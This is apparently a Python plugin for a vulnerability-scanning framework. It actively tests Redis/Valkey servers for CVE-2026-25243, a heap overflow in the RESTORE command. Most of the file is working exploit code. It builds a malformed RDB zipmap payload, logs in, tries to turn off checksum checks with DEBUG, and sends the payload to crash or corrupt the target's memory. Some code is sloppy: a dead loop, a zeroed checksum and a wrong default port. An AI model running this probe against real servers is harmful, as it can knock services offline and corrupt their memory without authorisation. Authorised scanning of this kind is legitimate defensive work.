#!/usr/bin/env python3
"""CVE-2026-25243 – Redis/Valkey RESTORE RDB Zipmap Heap Buffer Overflow → potential RCE.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-25243%20Invalid%20Memory%20Access%20in%20Redis%20RESTORE%20Command%20May%20Lead%20to%20Remote%20Code%20Execution
  Files: ['exploit/exp.py']
  Technique:
    Attacker authenticates and sends: RESTORE <key> 0 <malformed_rdb_zipmap_payload>
    The payload sets RDB type byte = 9 (RDB_TYPE_HASH_ZIPMAP / legacy zipmap encoding).
    zipmapValidateIntegrity() accepts the payload while zipmapNext() length step is
    inconsistent, causing heap out-of-bounds read (and potential heap corruption / RCE).
  Auth required: PR:L – need valid credentials with RESTORE command permission.
  CVSS 4.0: 7.7 HIGH.

Reference: https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4
"""
from __future__ import annotations

import socket
import struct
from typing import Any, Optional

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 62,
    "cve": "CVE-2026-25243",
    "year": 2026,
    "domain": "network",
    "vendor_product": "Redis / Valkey",
    "component": "RESTORE command → rdbLoadObject → zipmapValidateIntegrity / zipmapNext (zipmap.c)",
    "type": "堆内存越界读取 / 潜在 RCE",
    "summary": (
        "CVE-2026-25243: Redis/Valkey RESTORE 命令在处理 RDB type 9 (HASH_ZIPMAP) 载荷时，"
        "zipmapValidateIntegrity 与 zipmapNext 的长度步长不一致，导致堆越界读/写。"
        "攻击者需有效认证且具备 RESTORE 权限，构造畸形 zipmap payload 可触发崩溃，"
        "理论上在特定堆布局下可升级为 RCE。"
    ),
    "source_url": "https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4",
    "requires_manual_review": False,
    "affected": [
        {"vendor": "Redis", "product": "redis", "versions": [{"version": "0", "status": "affected"}]},
    ],
}

# Malformed RDB zipmap payload for CVE-2026-25243
# DUMP payload format: [type 1B][object body][rdb_version 2B LE][crc64 8B LE]
# type 9 = RDB_TYPE_HASH_ZIPMAP (legacy zipmap encoding still accepted by RESTORE)
# zipmap body: <zmlen 1B><key_len 1B><key...><val_len 1B><free 1B><val...><0xFF end>
# We craft inconsistent lengths: zmlen says N entries but actual data is malformed
# so zipmapNext walks out of bounds.
def _build_malformed_zipmap_restore_payload() -> bytes:
    # Craft a zipmap where zmlen=1 but key_len field is overflowed
    # Format per zipmap.c: zmlen(1) + [keylen(1) + key + vallen(1) + freelen(1) + val]* + 0xFF
    zmlen = b"\x01"                # 1 entry claimed
    key_len = b"\x41"              # key len = 65 bytes
    key = b"A" * 10               # only 10 bytes → zipmapNext overshoot
    val_len = b"\xFE"              # val_len = 254 → huge allocation hint
    free_len = b"\x00"
    val = b"B" * 4                 # far fewer bytes than 254
    end = b"\xFF"
    zipmap_body = zmlen + key_len + key + val_len + free_len + val + end

    rdb_type = b"\x09"             # RDB_TYPE_HASH_ZIPMAP = 9
    # zipmap body is length-prefixed as a string in RDB: use encoding byte
    # For small strings: "\x00" + 1-byte len-prefix is wrong; use raw length-prefix format:
    # RDB string encoding: if len < 64 → just 1B length
    body_encoded = bytes([len(zipmap_body)]) + zipmap_body
    rdb_version = struct.pack("<H", 10)  # RDB version 10
    # CRC64 – we pass skip_crc=True option in the exploit command instead
    crc64_placeholder = b"\x00" * 8
    return rdb_type + body_encoded + rdb_version + crc64_placeholder


def _redis_cmd(sock: socket.socket, *args: Any) -> str:
    """Send a RESP command and return the raw response."""
    cmd = f"*{len(args)}\r\n"
    for a in args:
        enc = a if isinstance(a, bytes) else str(a).encode()
        cmd_bytes = cmd.encode() + b"".join(b"$" + str(len(enc)).encode() + b"\r\n" + enc + b"\r\n"
                                            for enc in [enc])
        # Build inline differently:
        break
    # Build proper RESP
    parts = [f"*{len(args)}\r\n".encode()]
    for a in args:
        enc = a if isinstance(a, bytes) else str(a).encode()
        parts.append(f"${len(enc)}\r\n".encode() + enc + b"\r\n")
    sock.sendall(b"".join(parts))
    return sock.recv(4096).decode(errors="replace")


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 6379))
    password: Optional[str] = params.get("redis_password") or params.get("password")
    key_name = "cve_2026_25243_test"

    evidence: dict = {
        "cve": "CVE-2026-25243",
        "target": f"{target_ip}:{port}",
        "technique": (
            "Send RESTORE command with RDB type 9 (HASH_ZIPMAP) payload where "
            "zmlen=1 but key_len field creates inconsistent step in zipmapNext, "
            "causing heap OOB read in zipmap.c."
        ),
        "requires_auth": True,
        "reference": "https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4",
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-25243%20Invalid%20Memory%20Access%20in%20Redis%20RESTORE%20Command%20May%20Lead%20to%20Remote%20Code%20Execution",
        "exploit_files": ["exploit/exp.py"],
    }

    try:
        with socket.create_connection((target_ip, port), timeout=8) as s:
            s.settimeout(5)

            # Step 1: AUTH if password given
            if password:
                auth_resp = _redis_cmd(s, "AUTH", password)
                evidence["auth_response"] = auth_resp.strip()
                if "ERR" in auth_resp or "WRONGPASS" in auth_resp:
                    evidence["error"] = f"AUTH failed: {auth_resp.strip()}"
                    return {"vulnerable": None, "evidence": evidence}

            # Step 2: Probe version via INFO SERVER
            try:
                _redis_cmd(s, "INFO", "SERVER")
            except Exception:
                pass

            # Step 3: Enable debug skip checksum (may not work on hardened installs)
            try:
                dbg_resp = _redis_cmd(s, "DEBUG", "SET-SKIP-CHECKSUM-VALIDATION", "yes")
                evidence["debug_skip_checksum"] = dbg_resp.strip()
            except Exception:
                evidence["debug_skip_checksum"] = "unavailable"

            # Step 4: Send RESTORE with malformed zipmap
            payload = _build_malformed_zipmap_restore_payload()
            evidence["payload_hex"] = payload[:32].hex() + "..."
            evidence["payload_type_byte"] = "0x09 (RDB_TYPE_HASH_ZIPMAP)"

            restore_resp = _redis_cmd(s, "RESTORE", key_name, "0", payload, "REPLACE")
            evidence["restore_response"] = restore_resp.strip()

            # Step 5: Interpret response
            if "Bad data format" in restore_resp or "DUMP" in restore_resp:
                # Server rejected payload → may indicate validation exists (patched)
                evidence["detail"] = "Server returned 'Bad data format' – zipmapValidateIntegrity may have rejected payload (could be patched)."
                evidence["vulnerable"] = False
            elif "+OK" in restore_resp:
                evidence["detail"] = "Server accepted malformed zipmap payload (+OK). Heap OOB read likely occurred during deserialization."
                evidence["vulnerable"] = True
            elif restore_resp.startswith(":") or restore_resp == "":
                evidence["detail"] = "Empty/unexpected response; server may have crashed (heap OOB triggered)."
                evidence["vulnerable"] = True
            else:
                evidence["detail"] = f"Response: {restore_resp.strip()}"
                evidence["vulnerable"] = None

    except ConnectionRefusedError:
        evidence["error"] = f"No Redis/Valkey service at {target_ip}:{port}"
        evidence["vulnerable"] = None
    except ConnectionResetError:
        evidence["detail"] = "Connection reset – server likely crashed (heap OOB triggered)."
        evidence["vulnerable"] = True
    except Exception as exc:
        evidence["error"] = str(exc)
        evidence["vulnerable"] = None

    return {
        "vulnerable": evidence.get("vulnerable"),
        "evidence": evidence,
        "requires_manual_review": bool(evidence.get("vulnerable") is None),
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class RedisRestoreHeapMemoryRCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-NET-062"
    meta_poc_name = 'CVE-2026-25243 Valkey RESTORE Zipmap Heap 越界 RCE Active Validation'
    meta_cve_id = "CVE-2026-25243"
    meta_severity = "High"
    meta_protocol = "redis"
    meta_target_os = ["linux", "bsd"]
    meta_required_params = []
    meta_optional_params = ["port", "redis_password", "password"]
    meta_profiles = ["network", "redis", "rce"]
    meta_source_url = "https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4"
    meta_references       = ['https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4']
    meta_attack_surface = "Redis/Valkey RESTORE 命令 – 需认证 – 畸形 RDB zipmap 载荷 → 堆越界读/写"
    is_disruptive = True
    meta_destructive_level = "MemoryCorruption"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "62_Redis_Restore_Heap_Memory_RCE_Audit") if "VULN" in dir() else "62_Redis_Restore_Heap_Memory_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = RedisRestoreHeapMemoryRCEAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
